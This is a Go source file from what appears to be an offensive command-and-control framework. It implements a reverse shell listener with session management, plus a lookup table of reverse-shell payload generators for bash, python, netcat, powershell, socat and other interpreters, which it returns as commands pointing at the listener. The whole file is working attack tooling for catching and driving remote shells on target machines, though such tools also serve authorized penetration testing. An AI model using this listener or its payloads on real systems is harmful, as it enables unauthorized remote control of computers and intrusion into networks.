package shell

import (
	"fmt"
	"net"
	"time"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/session"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

// --- Types ---

// Listener is a built-in TCP reverse shell listener with session management.
type Listener struct {
	manager *session.Manager
	lhost   string
	lport   int
}

// Payload generators indexed by PAYLOAD option value.
var payloads = c2.PayloadMap{
	"reverse_bash":          payload.Bash,
	"reverse_bash_min":      payload.BashMin,
	"reverse_bash_fd":       payload.BashFD,
	"reverse_python":        payload.Python,
	"reverse_python_pty":    payload.PythonPTY,
	"reverse_perl":          payload.Perl,
	"reverse_ruby":          payload.Ruby,
	"reverse_php":           payload.PHP,
	"reverse_netcat":        payload.Netcat,
	"reverse_netcat_mkfifo": payload.NetcatMkfifo,
	"reverse_powershell":    payload.PowerShell,
	"reverse_socat":         payload.Socat,
	"reverse_nodejs":        payload.NodeJS,
	"reverse_awk":           payload.Awk,
	"reverse_lua":           payload.Lua,
	"reverse_java":          payload.Java,
}

// --- Constructor ---

func New() *Listener { return &Listener{} }

func (l *Listener) Name() string { return "shell" }

// --- Setup ---

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport))
	if err != nil {
		return fmt.Errorf("failed to start listener: %w", err)
	}
	l.manager = session.NewManager(ln)
	l.manager.Start()
	output.Status("Listening on %s:%d", lhost, lport)
	return nil
}

// --- Payload ---

// GeneratePayload returns a reverse shell command.
// payloadType maps to the PAYLOAD option (e.g. "reverse_bash", "reverse_python").
// Falls back to bash for linux, powershell for windows.
func (l *Listener) GeneratePayload(targetOS, payloadType string) (string, error) {
	fallback := payload.Bash
	if targetOS == "windows" {
		fallback = payload.PowerShell
	}
	return c2.ResolvePayload(payloads, l.lhost, l.lport, payloadType, fallback)
}

// --- Session ---

// WaitForSession blocks until a session connects or the timeout expires.
// For backward compatibility, it accepts the first session and enters interactive mode.
func (l *Listener) WaitForSession(timeout time.Duration) error {
	sess, err := l.manager.Accept(timeout)
	if err != nil {
		return fmt.Errorf("no session received: %w", err)
	}
	sess.Interact()
	return nil
}

// --- SessionHandler interface ---

// Sessions returns all alive sessions.
func (l *Listener) Sessions() []*session.Session {
	return l.manager.List()
}

// Interact enters interactive mode for the given session.
func (l *Listener) Interact(id int) error {
	return l.manager.Interact(id)
}

// Kill terminates a session by ID.
func (l *Listener) Kill(id int) error {
	return l.manager.Kill(id)
}

// --- Shutdown ---

func (l *Listener) Shutdown() error {
	if l.manager != nil {
		l.manager.Close()
	}
	return nil
}
